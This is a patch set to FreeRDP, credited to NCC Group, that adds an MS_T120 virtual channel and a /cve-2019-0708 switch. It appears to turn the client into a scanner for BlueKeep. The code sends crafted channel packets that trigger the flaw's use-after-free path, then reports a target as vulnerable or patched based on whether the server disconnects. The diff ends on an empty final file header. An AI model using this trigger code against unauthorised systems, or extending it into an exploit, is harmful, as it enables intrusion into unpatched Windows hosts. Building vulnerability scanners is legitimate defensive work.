@@ -1,0 +1,877 @@
+diff '--exclude=build' -Naur FreeRDP_original/channels/mst120/ChannelOptions.cmake FreeRDP_scanner/channels/mst120/ChannelOptions.cmake
+--- FreeRDP_original/channels/mst120/ChannelOptions.cmake	1970-01-01 01:00:00.000000000 +0100
++++ FreeRDP_scanner/channels/mst120/ChannelOptions.cmake	2019-06-10 09:47:20.531990780 +0100
+@@ -0,0 +1,15 @@
++# Adapted from channels/cliprdr/ChannelOptions.cmake
++# Copyright 2019 NCC Group
++
++set(OPTION_DEFAULT OFF)
++set(OPTION_CLIENT_DEFAULT ON)
++set(OPTION_SERVER_DEFAULT ON)
++
++define_channel_options(NAME "mst120" TYPE "static"
++	DESCRIPTION "MS_T120 Virtual Channel Extension to trigger CVE-2019-0708"
++	SPECIFICATIONS "None"
++	DEFAULT ${OPTION_DEFAULT})
++
++define_channel_client_options(${OPTION_CLIENT_DEFAULT})
++define_channel_server_options(${OPTION_SERVER_DEFAULT})
++
+diff '--exclude=build' -Naur FreeRDP_original/channels/mst120/client/CMakeLists.txt FreeRDP_scanner/channels/mst120/client/CMakeLists.txt
+--- FreeRDP_original/channels/mst120/client/CMakeLists.txt	1970-01-01 01:00:00.000000000 +0100
++++ FreeRDP_scanner/channels/mst120/client/CMakeLists.txt	2019-06-10 09:47:20.531990780 +0100
+@@ -0,0 +1,29 @@
++# FreeRDP: A Remote Desktop Protocol Implementation
++# FreeRDP cmake build script
++#
++# Adapted from channels/cliprdr/client/CMakeLists.txt
++# Copyright 2019 NCC Group
++#
++# Licensed under the Apache License, Version 2.0 (the "License");
++# you may not use this file except in compliance with the License.
++# You may obtain a copy of the License at
++#
++#     http://www.apache.org/licenses/LICENSE-2.0
++#
++# Unless required by applicable law or agreed to in writing, software
++# distributed under the License is distributed on an "AS IS" BASIS,
++# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
++# See the License for the specific language governing permissions and
++# limitations under the License.
++
++define_channel_client("mst120")
++
++set(${MODULE_PREFIX}_SRCS
++	mst120_main.c
++	mst120_main.h)
++
++add_channel_client_library(${MODULE_PREFIX} ${MODULE_NAME} ${CHANNEL_NAME} FALSE "VirtualChannelEntryEx")
++
++set(${MODULE_PREFIX}_LIBS freerdp winpr)
++
++set_property(TARGET ${MODULE_NAME} PROPERTY FOLDER "Channels/${CHANNEL_NAME}/Client")
+diff '--exclude=build' -Naur FreeRDP_original/channels/mst120/client/mst120_main.c FreeRDP_scanner/channels/mst120/client/mst120_main.c
+--- FreeRDP_original/channels/mst120/client/mst120_main.c	1970-01-01 01:00:00.000000000 +0100
++++ FreeRDP_scanner/channels/mst120/client/mst120_main.c	2019-06-11 09:25:27.516918630 +0100
+@@ -0,0 +1,481 @@
++/**
++ * FreeRDP: A Remote Desktop Protocol Implementation
++ * MS_T120 Virtual Channel for triggering CVE-2019-0708
++ *
++ * Adapted from channels/cliprdr/client/cliprdr_main.c
++ * Copyright 2019 NCC Group
++ *
++ * Licensed under the Apache License, Version 2.0 (the "License");
++ * you may not use this file except in compliance with the License.
++ * You may obtain a copy of the License at
++ *
++ *     http://www.apache.org/licenses/LICENSE-2.0
++ *
++ * Unless required by applicable law or agreed to in writing, software
++ * distributed under the License is distributed on an "AS IS" BASIS,
++ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
++ * See the License for the specific language governing permissions and
++ * limitations under the License.
++ */
++
++#ifdef HAVE_CONFIG_H
++#include "config.h"
++#endif
++
++#include <winpr/crt.h>
++#include <winpr/print.h>
++#include <time.h>
++#include <unistd.h>
++
++#include <freerdp/types.h>
++#include <freerdp/constants.h>
++#include <freerdp/client/mst120.h>
++
++#include "mst120_main.h"
++
++Mst120ClientContext* mst120_get_client_interface(mst120Plugin* mst120)
++{
++	Mst120ClientContext* pInterface;
++
++	if (!mst120)
++		return NULL;
++
++	pInterface = (Mst120ClientContext*) mst120->channelEntryPoints.pInterface;
++	return pInterface;
++}
++
++/**
++ * Function description
++ *
++ * @return 0 on success, otherwise a Win32 error code
++ */
++static UINT mst120_packet_send(mst120Plugin* mst120, wStream* s)
++{
++	size_t dataLen;
++	UINT status = CHANNEL_RC_OK;
++	dataLen = Stream_GetPosition(s);
++#ifdef WITH_DEBUG_MST120
++	WLog_DBG(TAG, "Mst120 Sending (%"PRIu32" bytes)", dataLen);
++	winpr_HexDump(TAG, WLOG_DEBUG, Stream_Buffer(s), dataLen);
++#endif
++
++	if (!mst120)
++	{
++		status = CHANNEL_RC_BAD_INIT_HANDLE;
++	}
++	else
++	{
++		status = mst120->channelEntryPoints.pVirtualChannelWriteEx(mst120->InitHandle,
++		         mst120->OpenHandle,
++		         Stream_Buffer(s), (UINT32) Stream_GetPosition(s), s);
++	}
++
++	if (status != CHANNEL_RC_OK)
++		WLog_ERR(TAG, "VirtualChannelWrite failed with %s [%08"PRIX32"]",
++		         WTSErrorToString(status), status);
++
++	return status;
++}
++
++/**
++ * Function description
++ *
++ * @return 0 on success, otherwise a Win32 error code
++ */
++static UINT mst120_virtual_channel_event_data_received(mst120Plugin* mst120,
++        void* pData, UINT32 dataLength, UINT32 totalLength, UINT32 dataFlags)
++{
++	wStream* data_in;
++
++	if ((dataFlags & CHANNEL_FLAG_SUSPEND) || (dataFlags & CHANNEL_FLAG_RESUME))
++	{
++		return CHANNEL_RC_OK;
++	}
++
++	if (dataFlags & CHANNEL_FLAG_FIRST)
++	{
++		if (mst120->data_in)
++			Stream_Free(mst120->data_in, TRUE);
++
++		mst120->data_in = Stream_New(NULL, totalLength);
++	}
++
++	if (!(data_in = mst120->data_in))
++	{
++		WLog_ERR(TAG, "Stream_New failed!");
++		return CHANNEL_RC_NO_MEMORY;
++	}
++
++	if (!Stream_EnsureRemainingCapacity(data_in, dataLength))
++	{
++		Stream_Free(mst120->data_in, TRUE);
++		mst120->data_in = NULL;
++		return CHANNEL_RC_NO_MEMORY;
++	}
++
++	Stream_Write(data_in, pData, dataLength);
++
++	if (dataFlags & CHANNEL_FLAG_LAST)
++	{
++		if (Stream_Capacity(data_in) != Stream_GetPosition(data_in))
++		{
++			WLog_ERR(TAG, "mst120_plugin_process_received: read error");
++			return ERROR_INTERNAL_ERROR;
++		}
++
++		mst120->data_in = NULL;
++		Stream_SealLength(data_in);
++		Stream_SetPosition(data_in, 0);
++
++		if (!MessageQueue_Post(mst120->queue, NULL, 0, (void*) data_in, NULL))
++		{
++			WLog_ERR(TAG, "MessageQueue_Post failed!");
++			return ERROR_INTERNAL_ERROR;
++		}
++	}
++
++	return CHANNEL_RC_OK;
++}
++
++static VOID VCAPITYPE mst120_virtual_channel_open_event_ex(LPVOID lpUserParam, DWORD openHandle,
++        UINT event,
++        LPVOID pData, UINT32 dataLength, UINT32 totalLength, UINT32 dataFlags)
++{
++	UINT error = CHANNEL_RC_OK;
++	mst120Plugin* mst120 = (mst120Plugin*) lpUserParam;
++
++	if (!mst120 || (mst120->OpenHandle != openHandle))
++	{
++		WLog_ERR(TAG, "error no match");
++		return;
++	}
++
++	switch (event)
++	{
++		case CHANNEL_EVENT_DATA_RECEIVED:
++			WLog_DBG(TAG, "CHANNEL_EVENT_DATA_RECEIVED: 0x%x bytes\n", dataLength);
++			if ((error = mst120_virtual_channel_event_data_received(mst120, pData, dataLength,
++			             totalLength, dataFlags)))
++				WLog_ERR(TAG, "failed with error %"PRIu32"", error);
++
++			break;
++
++		case CHANNEL_EVENT_WRITE_COMPLETE:
++			WLog_DBG(TAG, "CHANNEL_EVENT_WRITE_COMPLETE NOT IMPLEMENTED\n");
++			break;
++
++		case CHANNEL_EVENT_USER:
++			WLog_DBG(TAG, "CHANNEL_EVENT_WRITE_COMPLETE NOT IMPLEMENTED\n");
++			break;
++	}
++
++	if (error && mst120->context->rdpcontext)
++		setChannelError(mst120->context->rdpcontext, error,
++		                "mst120_virtual_channel_open_event_ex reported an error");
++}
++
++/**
++ * Function description
++ *
++ * @return 0 on success, otherwise a Win32 error code
++ */
++static UINT mst120_send_check_packet(mst120Plugin* mst120,
++									 size_t size, 
++									 size_t offset)
++{
++	wStream* s;
++
++	s = Stream_New(NULL, size);
++	if (!s)
++	{
++		WLog_ERR(TAG, "Stream_New failed!");
++		return 1;
++	}
++
++	char *buff = (char*)malloc(size);
++	if (!buff)
++		return 1;
++
++	// This is just to ease debugging - gives us some known data
++	memset(buff, 0, size);
++	for (int i=0; i<4; i++) {
++		buff[i] = 0x8;
++	}
++
++	buff[offset] = 2;
++
++	Stream_Write(s, buff, size);
++	free(buff);
++	
++	return mst120_packet_send(mst120, s);
++}
++
++#define MST120_SEND_MAX 5
++#define MST120_TIMEOUT 5  // in seconds
++
++static int check_count;
++static int first_check;
++
++static void
++mst120_check(mst120Plugin* mst120)
++{
++	if (check_count > MST120_SEND_MAX)
++	{
++		printf("[-] Max sends reached, please wait to be sure...\n");
++		while (1)
++		{
++			int now = time(0);
++
++			if (first_check == 0)
++			{
++				first_check = now;
++			}
++			else
++			{
++				if ((now - first_check) > MST120_TIMEOUT)
++				{
++					printf("[*] Target appears patched.\n");
++					exit(0);
++				}
++			}
++		}
++		return;
++	}
++
++	++check_count;
++	mst120_send_check_packet(mst120, 0x20, 8);	// 64-bit Windows
++	mst120_send_check_packet(mst120, 0x10, 4);	// 32-bit Windows
++}
++
++static DWORD WINAPI mst120_virtual_channel_client_thread(LPVOID arg)
++{
++	wStream* data;
++	wMessage message;
++	mst120Plugin* mst120 = (mst120Plugin*) arg;
++		
++	check_count = 0;
++	first_check = 0;
++
++	while (TRUE) {
++		mst120_check(mst120);
++	}
++
++	ExitThread(0);
++	return 0;
++}
++
++static void mst120_free_msg(void* obj)
++{
++	wMessage* msg = (wMessage*)obj;
++
++	if (msg)
++	{
++		wStream* s = (wStream*)msg->wParam;
++		Stream_Free(s, TRUE);
++	}
++}
++
++/**
++ * Function description
++ *
++ * @return 0 on success, otherwise a Win32 error code
++ */
++static UINT mst120_virtual_channel_event_connected(mst120Plugin* mst120,
++        LPVOID pData, UINT32 dataLength)
++{
++	UINT32 status;
++	wObject obj = { 0 };
++	status = mst120->channelEntryPoints.pVirtualChannelOpenEx(mst120->InitHandle,
++	         &mst120->OpenHandle, mst120->channelDef.name,
++	         mst120_virtual_channel_open_event_ex);
++
++	if (status != CHANNEL_RC_OK)
++	{
++		WLog_ERR(TAG, "pVirtualChannelOpen failed with %s [%08"PRIX32"]",
++		         WTSErrorToString(status), status);
++		return status;
++	}
++
++	obj.fnObjectFree = mst120_free_msg;
++	mst120->queue = MessageQueue_New(&obj);
++
++	if (!mst120->queue)
++	{
++		WLog_ERR(TAG, "MessageQueue_New failed!");
++		return ERROR_NOT_ENOUGH_MEMORY;
++	}
++
++	if (!(mst120->thread = CreateThread(NULL, 0, mst120_virtual_channel_client_thread,
++	                                     (void*) mst120,
++	                                     0, NULL)))
++	{
++		WLog_ERR(TAG, "CreateThread failed!");
++		MessageQueue_Free(mst120->queue);
++		mst120->queue = NULL;
++		return ERROR_INTERNAL_ERROR;
++	}
++
++	return CHANNEL_RC_OK;
++}
++
++/**
++ * Function description
++ *
++ * @return 0 on success, otherwise a Win32 error code
++ */
++static UINT mst120_virtual_channel_event_disconnected(mst120Plugin* mst120)
++{
++	UINT rc;
++
++	if (mst120->OpenHandle == 0)
++		return CHANNEL_RC_OK;
++
++	if (MessageQueue_PostQuit(mst120->queue, 0)
++	    && (WaitForSingleObject(mst120->thread, INFINITE) == WAIT_FAILED))
++	{
++		rc = GetLastError();
++		WLog_ERR(TAG, "WaitForSingleObject failed with error %"PRIu32"", rc);
++		return rc;
++	}
++
++	MessageQueue_Free(mst120->queue);
++	CloseHandle(mst120->thread);
++	rc = mst120->channelEntryPoints.pVirtualChannelCloseEx(mst120->InitHandle, mst120->OpenHandle);
++
++	if (CHANNEL_RC_OK != rc)
++	{
++		WLog_ERR(TAG, "pVirtualChannelClose failed with %s [%08"PRIX32"]",
++		         WTSErrorToString(rc), rc);
++		return rc;
++	}
++
++	mst120->OpenHandle = 0;
++
++	if (mst120->data_in)
++	{
++		Stream_Free(mst120->data_in, TRUE);
++		mst120->data_in = NULL;
++	}
++
++	return CHANNEL_RC_OK;
++}
++
++/**
++ * Function description
++ *
++ * @return 0 on success, otherwise a Win32 error code
++ */
++static UINT mst120_virtual_channel_event_terminated(mst120Plugin* mst120)
++{
++	mst120->InitHandle = 0;
++	free(mst120->context);
++	free(mst120);
++	return CHANNEL_RC_OK;
++}
++
++static VOID VCAPITYPE mst120_virtual_channel_init_event_ex(LPVOID lpUserParam, LPVOID pInitHandle,
++        UINT event, LPVOID pData, UINT dataLength)
++{
++	UINT error = CHANNEL_RC_OK;
++	mst120Plugin* mst120 = (mst120Plugin*) lpUserParam;
++
++	if (!mst120 || (mst120->InitHandle != pInitHandle))
++	{
++		WLog_ERR(TAG, "error no match");
++		return;
++	}
++
++	switch (event)
++	{
++		case CHANNEL_EVENT_CONNECTED:
++			if ((error = mst120_virtual_channel_event_connected(mst120, pData, dataLength)))
++				WLog_ERR(TAG, "mst120_virtual_channel_event_connected failed with error %"PRIu32"!",
++				         error);
++
++			break;
++
++		case CHANNEL_EVENT_DISCONNECTED:
++			if ((error = mst120_virtual_channel_event_disconnected(mst120)))
++				WLog_ERR(TAG,
++				         "mst120_virtual_channel_event_disconnected failed with error %"PRIu32"!", error);
++
++			break;
++
++		case CHANNEL_EVENT_TERMINATED:
++			if ((error = mst120_virtual_channel_event_terminated(mst120)))
++				WLog_ERR(TAG, "mst120_virtual_channel_event_terminated failed with error %"PRIu32"!",
++				         error);
++
++			break;
++	}
++
++	if (error && mst120->context->rdpcontext)
++		setChannelError(mst120->context->rdpcontext, error,
++		                "mst120_virtual_channel_init_event reported an error");
++}
++
++/* mst120 is always built-in */
++#define VirtualChannelEntryEx	mst120_VirtualChannelEntryEx
++
++BOOL VCAPITYPE VirtualChannelEntryEx(PCHANNEL_ENTRY_POINTS pEntryPoints, PVOID pInitHandle)
++{
++	UINT rc;
++	mst120Plugin* mst120;
++	Mst120ClientContext* context = NULL;
++	CHANNEL_ENTRY_POINTS_FREERDP_EX* pEntryPointsEx;
++	mst120 = (mst120Plugin*) calloc(1, sizeof(mst120Plugin));
++
++	if (!mst120)
++	{
++		WLog_ERR(TAG, "calloc failed!");
++		return FALSE;
++	}
++
++	// we need no CHANNEL_OPTION_SHOW_PROTOCOL to pass condition in rdpwd!WDW_OnDataReceived()
++	// and not have CHANNEL_FLAG_SHOW_PROTOCOL
++	mst120->channelDef.options =
++	    CHANNEL_OPTION_INITIALIZED |
++	    CHANNEL_OPTION_ENCRYPT_RDP |
++	    CHANNEL_OPTION_COMPRESS_RDP;
++	sprintf_s(mst120->channelDef.name, ARRAYSIZE(mst120->channelDef.name), "MS_T120");
++	pEntryPointsEx = (CHANNEL_ENTRY_POINTS_FREERDP_EX*) pEntryPoints;
++
++	if ((pEntryPointsEx->cbSize >= sizeof(CHANNEL_ENTRY_POINTS_FREERDP_EX)) &&
++	    (pEntryPointsEx->MagicNumber == FREERDP_CHANNEL_MAGIC_NUMBER))
++	{
++		context = (Mst120ClientContext*) calloc(1, sizeof(Mst120ClientContext));
++
++		if (!context)
++		{
++			free(mst120);
++			WLog_ERR(TAG, "calloc failed!");
++			return FALSE;
++		}
++
++		context->handle = (void*) mst120;
++		context->custom = NULL;
++		mst120->context = context;
++		context->rdpcontext = pEntryPointsEx->context;
++	}
++
++	mst120->log = WLog_Get("com.freerdp.channels.mst120.client");
++	WLog_Print(mst120->log, WLOG_DEBUG, "VirtualChannelEntryEx");
++	CopyMemory(&(mst120->channelEntryPoints), pEntryPoints,
++	           sizeof(CHANNEL_ENTRY_POINTS_FREERDP_EX));
++	mst120->InitHandle = pInitHandle;
++	rc = mst120->channelEntryPoints.pVirtualChannelInitEx(mst120, context, pInitHandle,
++	        &mst120->channelDef, 1, VIRTUAL_CHANNEL_VERSION_WIN2000,
++	        mst120_virtual_channel_init_event_ex);
++
++	if (CHANNEL_RC_OK != rc)
++	{
++		WLog_ERR(TAG, "pVirtualChannelInit failed with %s [%08"PRIX32"]",
++		         WTSErrorToString(rc), rc);
++		free(mst120->context);
++		free(mst120);
++		return FALSE;
++	}
++
++	mst120->channelEntryPoints.pInterface = context;
++	return TRUE;
++}
+diff '--exclude=build' -Naur FreeRDP_original/channels/mst120/client/mst120_main.h FreeRDP_scanner/channels/mst120/client/mst120_main.h
+--- FreeRDP_original/channels/mst120/client/mst120_main.h	1970-01-01 01:00:00.000000000 +0100
++++ FreeRDP_scanner/channels/mst120/client/mst120_main.h	2019-06-10 09:47:20.531990780 +0100
+@@ -0,0 +1,56 @@
++/**
++ * FreeRDP: A Remote Desktop Protocol Implementation
++ * MS_T120 Virtual Channel for triggering CVE-2019-0708
++ *
++ * Adapted from channels/cliprdr/client/cliprdr_main.h
++ * Copyright 2019 NCC Group
++ *
++ * Licensed under the Apache License, Version 2.0 (the "License");
++ * you may not use this file except in compliance with the License.
++ * You may obtain a copy of the License at
++ *
++ *     http://www.apache.org/licenses/LICENSE-2.0
++ *
++ * Unless required by applicable law or agreed to in writing, software
++ * distributed under the License is distributed on an "AS IS" BASIS,
++ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
++ * See the License for the specific language governing permissions and
++ * limitations under the License.
++ */
++
++#ifndef FREERDP_CHANNEL_MST120_CLIENT_MAIN_H
++#define FREERDP_CHANNEL_MST120_CLIENT_MAIN_H
++
++#include <winpr/stream.h>
++
++#include <freerdp/svc.h>
++#include <freerdp/addin.h>
++#include <freerdp/channels/log.h>
++
++#define TAG CHANNELS_TAG("mst120.client")
++
++struct mst120_plugin
++{
++	CHANNEL_DEF channelDef;
++	CHANNEL_ENTRY_POINTS_FREERDP_EX channelEntryPoints;
++
++	Mst120ClientContext* context;
++
++	wLog* log;
++	HANDLE thread;
++	wStream* data_in;
++	void* InitHandle;
++	DWORD OpenHandle;
++	wMessageQueue* queue;
++};
++typedef struct mst120_plugin mst120Plugin;
++
++Mst120ClientContext* mst120_get_client_interface(mst120Plugin* mst120);
++
++#ifdef WITH_DEBUG_MST120
++#define DEBUG_MST120(...) WLog_DBG(TAG, __VA_ARGS__)
++#else
++#define DEBUG_MST120(...) do { } while (0)
++#endif
++
++#endif /* FREERDP_CHANNEL_MST120_CLIENT_MAIN_H */
+diff '--exclude=build' -Naur FreeRDP_original/channels/mst120/CMakeLists.txt FreeRDP_scanner/channels/mst120/CMakeLists.txt
+--- FreeRDP_original/channels/mst120/CMakeLists.txt	1970-01-01 01:00:00.000000000 +0100
++++ FreeRDP_scanner/channels/mst120/CMakeLists.txt	2019-06-10 09:47:20.531990780 +0100
+@@ -0,0 +1,27 @@
++# FreeRDP: A Remote Desktop Protocol Implementation
++# FreeRDP cmake build script
++#
++# Adapted from channels/cliprdr/CMakeLists.txt
++# Copyright 2019 NCC Group
++#
++# Licensed under the Apache License, Version 2.0 (the "License");
++# you may not use this file except in compliance with the License.
++# You may obtain a copy of the License at
++#
++#     http://www.apache.org/licenses/LICENSE-2.0
++#
++# Unless required by applicable law or agreed to in writing, software
++# distributed under the License is distributed on an "AS IS" BASIS,
++# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
++# See the License for the specific language governing permissions and
++# limitations under the License.
++
++define_channel("mst120")
++
++if(WITH_CLIENT_CHANNELS)
++	add_channel_client(${MODULE_PREFIX} ${CHANNEL_NAME})
++endif()
++
++if(WITH_SERVER_CHANNELS)
++	add_channel_server(${MODULE_PREFIX} ${CHANNEL_NAME})
++endif()
+diff '--exclude=build' -Naur FreeRDP_original/client/common/cmdline.c FreeRDP_scanner/client/common/cmdline.c
+--- FreeRDP_original/client/common/cmdline.c	2019-06-05 08:59:36.201112153 +0100
++++ FreeRDP_scanner/client/common/cmdline.c	2019-06-10 09:47:20.531990780 +0100
+@@ -875,6 +875,14 @@
+ 	{
+ 		settings->SupportEchoChannel = enable;
+ 	}
++	CommandLineSwitchCase(arg, "cve-2019-0708")
++	{
++		settings->cve_2019_0708 = TRUE;
++	}
++	CommandLineSwitchCase(arg, "show-x")
++	{
++		settings->show_x = TRUE;
++	}
+ 	CommandLineSwitchCase(arg, "ssh-agent")
+ 	{
+ 		settings->SupportSSHAgentChannel = enable;
+@@ -3239,6 +3247,13 @@
+ 		        settings))
+ 			return FALSE;
+ 	}
++
++	if (settings->cve_2019_0708)
++	{
++		if (!freerdp_client_load_static_channel_addin(channels, settings, "mst120",
++		        settings))
++			return FALSE;
++	}
+ 
+ 	if (settings->RemdeskVirtualChannel)
+ 	{
+diff '--exclude=build' -Naur FreeRDP_original/client/common/cmdline.h FreeRDP_scanner/client/common/cmdline.h
+--- FreeRDP_original/client/common/cmdline.h	2019-06-05 08:59:36.201112153 +0100
++++ FreeRDP_scanner/client/common/cmdline.h	2019-06-10 09:47:20.531990780 +0100
+@@ -190,6 +190,8 @@
+ 	{ "window-position", COMMAND_LINE_VALUE_REQUIRED, "<xpos>x<ypos>", NULL, NULL, -1, NULL, "window position" },
+ 	{ "wm-class", COMMAND_LINE_VALUE_REQUIRED, "<class-name>", NULL, NULL, -1, NULL, "Set the WM_CLASS hint for the window instance" },
+ 	{ "workarea", COMMAND_LINE_VALUE_FLAG, NULL, NULL, NULL, -1, NULL, "Use available work area" },
++	{ "cve-2019-0708", COMMAND_LINE_VALUE_FLAG, NULL, NULL, NULL, -1, NULL, "Trigger cve-2019-0708" },
++	{ "show-x", COMMAND_LINE_VALUE_FLAG, NULL, NULL, NULL, -1, NULL, "Force show X window when /cve-2019-0708 is used" },
+ 	{ NULL, 0, NULL, NULL, NULL, -1, NULL, NULL }
+ };
+ #endif /* CLIENT_COMMON_CMDLINE_H */
+diff '--exclude=build' -Naur FreeRDP_original/client/X11/xf_window.c FreeRDP_scanner/client/X11/xf_window.c
+--- FreeRDP_original/client/X11/xf_window.c	2019-06-05 08:59:18.729019878 +0100
++++ FreeRDP_scanner/client/X11/xf_window.c	2019-06-10 09:47:20.531990780 +0100
+@@ -557,18 +557,22 @@
+ 	XSelectInput(xfc->display, window->handle, input_mask);
+ 	XClearWindow(xfc->display, window->handle);
+ 	xf_SetWindowTitleText(xfc, window->handle, name);
+-	XMapWindow(xfc->display, window->handle);
++	if (!settings->cve_2019_0708 || settings->show_x) {
++		XMapWindow(xfc->display, window->handle);
++	}
+ 	xf_input_init(xfc, window->handle);
+ 
+ 	/*
+ 	 * NOTE: This must be done here to handle reparenting the window,
+ 	 * so that we don't miss the event and hang waiting for the next one
+ 	 */
+-	do
+-	{
+-		XMaskEvent(xfc->display, VisibilityChangeMask, &xevent);
++	if (!settings->cve_2019_0708 || settings->show_x) {
++		do
++		{
++			XMaskEvent(xfc->display, VisibilityChangeMask, &xevent);
++		}
++		while (xevent.type != VisibilityNotify);
+ 	}
+-	while (xevent.type != VisibilityNotify);
+ 
+ 	/*
+ 	 * The XCreateWindow call will start the window in the upper-left corner of our current
+diff '--exclude=build' -Naur FreeRDP_original/config.h.in FreeRDP_scanner/config.h.in
+--- FreeRDP_original/config.h.in	2019-06-05 08:59:36.201112153 +0100
++++ FreeRDP_scanner/config.h.in	2019-06-10 09:47:20.531990780 +0100
+@@ -80,6 +80,9 @@
+ #cmakedefine CHANNEL_CLIPRDR
+ #cmakedefine CHANNEL_CLIPRDR_CLIENT
+ #cmakedefine CHANNEL_CLIPRDR_SERVER
++#cmakedefine CHANNEL_MST120
++#cmakedefine CHANNEL_MST120_CLIENT
++#cmakedefine CHANNEL_MST120_SERVER
+ #cmakedefine CHANNEL_DISP
+ #cmakedefine CHANNEL_DISP_CLIENT
+ #cmakedefine CHANNEL_DISP_SERVER
+@@ -140,6 +143,7 @@
+ #cmakedefine WITH_DEBUG_CAPABILITIES
+ #cmakedefine WITH_DEBUG_CHANNELS
+ #cmakedefine WITH_DEBUG_CLIPRDR
++#cmakedefine WITH_DEBUG_MST120
+ #cmakedefine WITH_DEBUG_DVC
+ #cmakedefine WITH_DEBUG_TSMF
+ #cmakedefine WITH_DEBUG_KBD
+diff '--exclude=build' -Naur FreeRDP_original/include/freerdp/channels/mst120.h FreeRDP_scanner/include/freerdp/channels/mst120.h
+--- FreeRDP_original/include/freerdp/channels/mst120.h	1970-01-01 01:00:00.000000000 +0100
++++ FreeRDP_scanner/include/freerdp/channels/mst120.h	2019-06-10 09:47:20.531990780 +0100
+@@ -0,0 +1,32 @@
++/**
++ * FreeRDP: A Remote Desktop Protocol Implementation
++ * MS_T120 Virtual Channel for triggering CVE-2019-0708
++ *
++ * Adapted from include/freerdp/channels/cliprdr.h
++ * Copyright 2019 NCC Group
++ *
++ * Licensed under the Apache License, Version 2.0 (the "License");
++ * you may not use this file except in compliance with the License.
++ * You may obtain a copy of the License at
++ *
++ *	 http://www.apache.org/licenses/LICENSE-2.0
++ *
++ * Unless required by applicable law or agreed to in writing, software
++ * distributed under the License is distributed on an "AS IS" BASIS,
++ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
++ * See the License for the specific language governing permissions and
++ * limitations under the License.
++ */
++
++#ifndef FREERDP_CHANNEL_MST120_H
++#define FREERDP_CHANNEL_MST120_H
++
++#include <freerdp/api.h>
++#include <freerdp/types.h>
++
++#include <winpr/shell.h>
++
++#define MST120_SVC_CHANNEL_NAME	"mst120"
++
++#endif /* FREERDP_CHANNEL_MST120_H */
++
+diff '--exclude=build' -Naur FreeRDP_original/include/freerdp/client/mst120.h FreeRDP_scanner/include/freerdp/client/mst120.h
+--- FreeRDP_original/include/freerdp/client/mst120.h	1970-01-01 01:00:00.000000000 +0100
++++ FreeRDP_scanner/include/freerdp/client/mst120.h	2019-06-10 09:47:20.531990780 +0100
+@@ -0,0 +1,44 @@
++/**
++ * FreeRDP: A Remote Desktop Protocol Implementation
++ * MS_T120 Virtual Channel for triggering CVE-2019-0708
++ *
++ * Adapted from include/freerdp/client/cliprdr.h
++ * Copyright 2019 NCC Group
++ *
++ * Licensed under the Apache License, Version 2.0 (the "License");
++ * you may not use this file except in compliance with the License.
++ * You may obtain a copy of the License at
++ *
++ *     http://www.apache.org/licenses/LICENSE-2.0
++ *
++ * Unless required by applicable law or agreed to in writing, software
++ * distributed under the License is distributed on an "AS IS" BASIS,
++ * WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.
++ * See the License for the specific language governing permissions and
++ * limitations under the License.
++ */
++
++#ifndef FREERDP_CHANNEL_MST120_CLIENT_MST120_H
++#define FREERDP_CHANNEL_MST120_CLIENT_MST120_H
++
++#include <freerdp/types.h>
++
++#include <freerdp/message.h>
++#include <freerdp/channels/mst120.h>
++#include <freerdp/freerdp.h>
++
++/**
++ * Client Interface
++ */
++
++typedef struct _mst120_client_context Mst120ClientContext;
++
++struct _mst120_client_context
++{
++	void* handle;
++	void* custom;
++
++	rdpContext* rdpcontext;
++};
++
++#endif /* FREERDP_CHANNEL_MST120_CLIENT_MST120_H */
+diff '--exclude=build' -Naur FreeRDP_original/include/freerdp/settings.h FreeRDP_scanner/include/freerdp/settings.h
+--- FreeRDP_original/include/freerdp/settings.h	2019-06-05 08:59:36.201112153 +0100
++++ FreeRDP_scanner/include/freerdp/settings.h	2019-06-10 09:47:20.531990780 +0100
+@@ -1538,6 +1538,8 @@
+ 	SettingsModified;  /* byte array marking fields that have been modified from their default value */
+ 	ALIGN64 char* ActionScript;
+ 	ALIGN64 DWORD  Floatbar;
++	ALIGN64 BOOL cve_2019_0708; /* HAX */
++	ALIGN64 BOOL show_x;
+ 
+ };
+ typedef struct rdp_settings rdpSettings;
+diff '--exclude=build' -Naur FreeRDP_original/libfreerdp/core/nego.c FreeRDP_scanner/libfreerdp/core/nego.c
+--- FreeRDP_original/libfreerdp/core/nego.c	2019-06-05 08:59:18.857020562 +0100
++++ FreeRDP_scanner/libfreerdp/core/nego.c	2019-06-11 09:27:58.421242206 +0100
+@@ -190,8 +190,12 @@
+ 
+ 			if (nego->state == NEGO_STATE_FAIL)
+ 			{
+-				if (freerdp_get_last_error(nego->transport->context) == FREERDP_ERROR_SUCCESS)
++				if (freerdp_get_last_error(nego->transport->context) == FREERDP_ERROR_SUCCESS) {
+ 					WLog_ERR(TAG, "Protocol Security Negotiation Failure");
++					if (settings->cve_2019_0708) {
++						printf("[-] Can't connect properly, check IP address and port\n");
++					}
++				}
+ 
+ 				nego->state = NEGO_STATE_FINAL;
+ 				return FALSE;
+diff '--exclude=build' -Naur FreeRDP_original/libfreerdp/core/rdp.c FreeRDP_scanner/libfreerdp/core/rdp.c
+--- FreeRDP_original/libfreerdp/core/rdp.c	2019-06-05 08:59:36.201112153 +0100
++++ FreeRDP_scanner/libfreerdp/core/rdp.c	2019-06-10 09:53:02.972558646 +0100
+@@ -402,6 +402,13 @@
+ 		EventArgsInit(&e, "freerdp");
+ 		e.code = 0;
+ 		PubSub_OnTerminate(context->pubSub, context, &e);
++		
++
++		if (rdp->settings->cve_2019_0708) {
++			printf("[!] Target is VULNERABLE!!!\n");
++			exit(0);
++		}
++
+ 		return TRUE;
+ 	}
+ 
+@@ -1397,6 +1404,9 @@
+ 				if (nla_recv_pdu(rdp->nla, s) < 1)
+ 				{
+ 					WLog_ERR(TAG, "rdp_recv_callback: CONNECTION_STATE_NLA - nla_recv_pdu() fail");
++					if (rdp->settings->cve_2019_0708) {
++						printf("[-] NLA enabled and can't authenticate using provided credentials. Detection failed.\n");
++					}
+ 					return -1;
+ 				}
+ 			}
+diff '--exclude=build' -Naur FreeRDP_original/libfreerdp/core/transport.c FreeRDP_scanner/libfreerdp/core/transport.c
+--- FreeRDP_original/libfreerdp/core/transport.c	2019-06-05 08:59:18.873020647 +0100
++++ FreeRDP_scanner/libfreerdp/core/transport.c	2019-06-10 10:10:17.869934775 +0100
